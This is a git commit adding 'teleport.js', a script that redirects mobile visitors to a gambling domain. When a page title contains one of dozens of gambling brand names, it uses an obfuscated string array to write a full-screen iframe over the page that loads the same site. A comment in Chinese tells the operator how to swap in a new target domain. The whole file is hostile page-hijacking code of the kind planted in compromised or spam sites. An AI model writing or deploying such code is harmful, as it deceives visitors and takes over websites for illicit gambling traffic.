e9c865e186943482fddf72397e86eec2a9837fa1
ponpon-tc <ponpon@tensioncapital.com>
2017-06-27 15:58:03 +0800

    teleport

---
+++ teleport.js
@@ -0,0 +1,85 @@
+﻿var mobiles = new Array("midp", "j2me", "avant", "docomo", "novarra", "palmos", "palmsource", "240x320", "opwv", "chtml", "pda", "windows ce", "mmp/", "blackberry", "mib/", "symbian", "wireless", "nokia", "hand", "mobi", "phone", "cdm", "up.b", "audio", "sie-", "sec-", "samsung", "htc", "mot-", "mitsu", "sagem", "sony", "alcatel", "lg", "eric", "vx", "NEC", "philips", "mmm", "xx", "panasonic", "sharp", "wap", "sch", "rover", "pocket", "benq", "java", "pt", "pg", "vox", "amoi", "bird", "compal", "kg", "voda", "sany", "kdd", "dbt", "sendo", "sgh", "gradi", "jb", "dddi", "moto", "iphone", "android", "iPod", "ipad", "iPad", "incognito", "webmate", "dream", "cupcake", "webos", "s8000", "bada", "googlebot-mobile")
+var ua = navigator.userAgent.toLowerCase();
+var isMobile = false;
+for (var i = 0; i < mobiles.length; i++) {
+	if (ua.indexOf(mobiles[i]) > 0) {
+		isMobile = true;
+		location.href = "http://i88laohu.com"; //要image的那個網頁放這裡,將檔案中所有hxh777覆蓋成新的
+	}
+}
+var str1 = document.title;
+var url;
+
+var _$ = ["1", "floor", "random", "length", "indexOf", "w88", "优德", 'http://i88laohu.com', "伟德", "韦德", "bv", "betvictor", 'http://i88laohu.com', "申博", 'http://i88laohu.com', "钱柜", 'http://i88laohu.com', "新博", "NB88", 'http://i88laohu.com', "通宝", "tbgame", "tongbao", 'http://i88laohu.com', "腾博", "tengbo", 'http://i88laohu.com', "九五", "95", 'http://i88laohu.com', "千亿", 'http://i88laohu.com', "亚虎", 'http://i88laohu.com', "U发", 'http://i88laohu.com', "威尼斯", 'http://i88laohu.com', "武松", 'http://i88laohu.com', "龙8", 'http://i88laohu.com', "乐虎", "letiger", 'http://i88laohu.com', "必发", 'http://i88laohu.com', "188bet", "金宝博", 'http://i88laohu.com', "bet365", 'http://i88laohu.com', "dahongying", 'http://i88laohu.com', "bwin", "必赢", 'http://i88laohu.com', "金沙", 'http://i88laohu.com', "齐乐", 'http://i88laohu.com', "博狗", 'http://i88laohu.com', "必赢亚洲", 'http://i88laohu.com', "胜博发", 'http://i88laohu.com', "大爆奖", 'http://i88laohu.com', "美人鱼", 'http://i88laohu.com', "大红鹰", 'http://i88laohu.com', "通博", 'http://i88laohu.com', "明仁亚洲", 'http://i88laohu.com', 'http://i88laohu.com', "document", "write", '<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />', '<style>html,body{widht:100%;height:100%;overflow:hidden;}</style>', '<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;">', '<iframe src=" ', '" frameborder="0" style="border:0;width: 100%; text-align: center; border: medium none; height:100%;max-height: 4000px;"></iframe>', '</div>'];
+var a = _$[0];
+var b = [0x1, 0x2];
+var c = Math[_$[1]](Math[_$[2]]() * b[_$[3]]);
+var d = b[c];
+if (str1[_$[4]](_$[5]) > -0x1 || str1[_$[4]](_$[6]) > -0x1) {
+	url = _$[7]
+} else if (str1[_$[4]](_$[8]) > -0x1 || str1[_$[4]](_$[9]) > -0x1 || str1[_$[4]](_$[10]) > -0x1 || str1[_$[4]](_$[11]) > -0x1) {
+	url = _$[12]
+} else if (str1[_$[4]](_$[13]) > -0x1) {
+	url = _$[14]
+} else if (str1[_$[4]](_$[15]) > -0x1) {
+	url = _$[16]
+} else if (str1[_$[4]](_$[17]) > -0x1 || str1[_$[4]](_$[18]) > -0x1) {
+	url = _$[19]
+} else if (str1[_$[4]](_$[20]) > -0x1 || str1[_$[4]](_$[21]) > -0x1 || str1[_$[4]](_$[22]) > -0x1) {
+	url = _$[23]
+} else if (str1[_$[4]](_$[24]) > -0x1 || str1[_$[4]](_$[25]) > -0x1) {
+	url = _$[26]
+} else if (str1[_$[4]](_$[27]) > -0x1 || str1[_$[4]](_$[28]) > -0x1) {
+	url = _$[29]
+} else if (str1[_$[4]](_$[30]) > -0x1) {
+	url = _$[31]
+} else if (str1[_$[4]](_$[32]) > -0x1) {
+	url = _$[33]
+} else if (str1[_$[4]](_$[34]) > -0x1) {
+	url = _$[35]
+} else if (str1[_$[4]](_$[36]) > -0x1) {
+	url = _$[37]
+} else if (str1[_$[4]](_$[38]) > -0x1) {
+	url = _$[39]
+} else if (str1[_$[4]](_$[40]) > -0x1) {
+	url = _$[41]
+} else if (str1[_$[4]](_$[42]) > -0x1 || str1[_$[4]](_$[43]) > -0x1) {
+	url = _$[44]
+} else if (str1[_$[4]](_$[45]) > -0x1) {
+	url = _$[46]
+} else if (str1[_$[4]](_$[47]) > -0x1 || str1[_$[4]](_$[48]) > -0x1) {
+	url = _$[49]
+} else if (str1[_$[4]](_$[50]) > -0x1) {
+	url = _$[51]
+} else if (str1[_$[4]](_$[52]) > -0x1) {
+	url = _$[53]
+} else if (str1[_$[4]](_$[54]) > -0x1 || str1[_$[4]](_$[55]) > -0x1) {
+	url = _$[56]
+} else if (str1[_$[4]](_$[57]) > -0x1) {
+	url = _$[58]
+} else if (str1[_$[4]](_$[59]) > -0x1) {
+	url = _$[60]
+} else if (str1[_$[4]](_$[61]) > -0x1) {
+	url = _$[62]
+} else if (str1[_$[4]](_$[63]) > -0x1) {
+	url = _$[64]
+} else if (str1[_$[4]](_$[65]) > -0x1) {
+	url = _$[66]
+} else if (str1[_$[4]](_$[67]) > -0x1) {
+	url = _$[68]
+} else if (str1[_$[4]](_$[69]) > -0x1) {
+	url = _$[70]
+} else if (str1[_$[4]](_$[71]) > -0x1) {
+	url = _$[72]
+} else if (str1[_$[4]](_$[73]) > -0x1) {
+	url = _$[74]
+} else if (str1[_$[4]](_$[75]) > -0x1) {
+	url = _$[76]
+} else {
+	url = _$[77]
+};
+window[_$[78]][_$[79]](_$[80]);
+window[_$[78]][_$[79]](_$[81]);
+window[_$[78]][_$[79]](_$[82]);
+window[_$[78]][_$[79]](_$[83] + url + _$[84]);
+window[_$[78]][_$[79]](_$[85]);
